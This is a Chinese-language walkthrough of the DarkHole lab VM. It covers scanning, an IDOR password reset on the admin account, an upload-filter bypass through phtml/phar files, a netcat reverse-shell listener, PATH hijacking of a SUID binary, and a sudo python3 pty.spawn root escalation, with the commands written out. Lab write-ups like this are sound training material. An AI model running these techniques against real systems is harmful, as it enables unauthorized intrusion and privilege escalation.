# 靶机信息
本靶机包含两个web漏洞拿下 www-data Shell。提权阶段，需要先横向移动通过 PATH 劫持获得 john用户权限。最终提权为 root，不错的靶机。

# 信息收集
## nmap扫描
```
nmap -sCV -p22,80 -O --min-rate 1000 192.168.218.227 -oA nmapScan/details
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 20:17 EST
Nmap scan report for 192.168.218.227 (192.168.218.227)
Host is up (0.00054s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e4:50:d9:50:5d:91:30:50:e9:b5:7d:ca:b0:51:db:74 (RSA)
|   256 73:0c:76:86:60:63:06:00:21:c2:36:20:3b:99:c1:f7 (ECDSA)
|_  256 54:53:4c:3f:4f:3a:26:f6:02:aa:9a:24:ea:1b:92:8c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: DarkHole
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 00:0C:29:31:1C:25 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
那么入口点应该在web了。

## web信息枚举
```
gobuster dir -u http://192.168.218.227 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,html,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.218.227
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/js                   (Status: 301) [Size: 315] [--> http://192.168.218.227/js/]
/css                  (Status: 301) [Size: 316] [--> http://192.168.218.227/css/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/register.php         (Status: 200) [Size: 2886]
/login.php            (Status: 200) [Size: 2507]
/config               (Status: 301) [Size: 319] [--> http://192.168.218.227/config/]
/upload               (Status: 301) [Size: 319] [--> http://192.168.218.227/upload/]
/index.php            (Status: 200) [Size: 810]
/dashboard.php        (Status: 200) [Size: 21]
/server-status        (Status: 403) [Size: 280]
/index.php            (Status: 200) [Size: 810]
Progress: 224656 / 224660 (100.00%)
```
功能点一个一个看，尽量别漏测，login表单看一个，挂一个sqlmap，注册功能发现存在admin账户，再挂一个爆破，然后注册两个正常账户可能看。

<img width="1913" height="967" alt="Image" src="https://github.com/user-attachments/assets/7e6bf1b0-59b3-4568-89a9-e392f1231359" />

URL中存在id字段，测试了一下，好像没有什么漏洞。


# 获取shell

接着翻一翻，没啥东西，看主页的几个框，感觉跟sql注入有关系。

以为是二次注入，抓包改包的时候，发现改密码的数据包有东西

<img width="1919" height="764" alt="Image" src="https://github.com/user-attachments/assets/72e7f97e-fc91-44ea-9e3d-f81fa4ce1766" />

指定了密码和id字段，那么改成1怎么样。看返回是成功了，然后登录admin账户。成功了

<img width="1918" height="957" alt="Image" src="https://github.com/user-attachments/assets/5587b817-6171-4e0f-95c1-218592bb14c0" />

文件上传了，然后有黑名单，要求上传图片，直接通杀发现phtml和phar后缀能执行

<img width="1915" height="874" alt="Image" src="https://github.com/user-attachments/assets/9ee00ea7-d942-4ca7-abfb-6ad70632ecd8" />

直接上shell，反弹回来。
```
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.218.148] from (UNKNOWN) [192.168.218.227] 46724
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

# 提权
随后在john的文件中看到有个可执行文件
```
www-data@darkhole:/home/john$ ls -l
ls -l
total 32
-rwxrwx--- 1 john john     1 Jul 17  2021 file.py
-rwxrwx--- 1 john john     8 Jul 17  2021 password
-rwsr-xr-x 1 root root 16784 Jul 17  2021 toto
-rw-rw---- 1 john john    24 Jul 17  2021 user.txt
www-data@darkhole:/home/john$ ./toto
./toto
uid=1001(john) gid=33(www-data) groups=33(www-data)
```
跟id行为很像，带有suid位，借助AI辅助逆向分析一下，在 main() 中固定执行 setuid(1001) 与 setgid(1001)，随后调用 system() 执行位于 .rodata（地址 0x2004）的硬编码命令，因此可将任意执行者的身份切换为john并运行该命令。然后查看硬编码处的命令就是字符id。

那么试试PATH劫持，先在tmp中写一个id文件 ` echo /bin/bash > /tmp/id` ，然后 `export PATH=/tmp:$PATH` 加入到PATH中，然后再执行toto程序，就获取了john的shell了，然后得到john的密码**root123**，这么简单直接爆了就。

最后的提权了，在开始的linpeas就发现了存在polkit的漏洞。试一下。不成功。先正常走。

```
john@darkhole:/var/www/html$sudo -l
[sudo] password for john: 
Matching Defaults entries for john on darkhole:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on darkhole:
    (root) /usr/bin/python3 /home/john/file.py
john@darkhole:/var/www/html$ 
```
看来是这个python文件提权，结果文件啥也没有，我还以为靶机坏了。
后面一想，这文件就是john用户的，那还说啥啊，直接root给你得了。

```
john@darkhole:~$ echo 'import pty;pty.spawn("/bin/bash")' > file.py 
john@darkhole:~$ sudo /usr/bin/python3 /home/john/file.py 
root@darkhole:/home/john# id
uid=0(root) gid=0(root) groups=0(root)
root@darkhole:/home/john# 
```
提权成功。




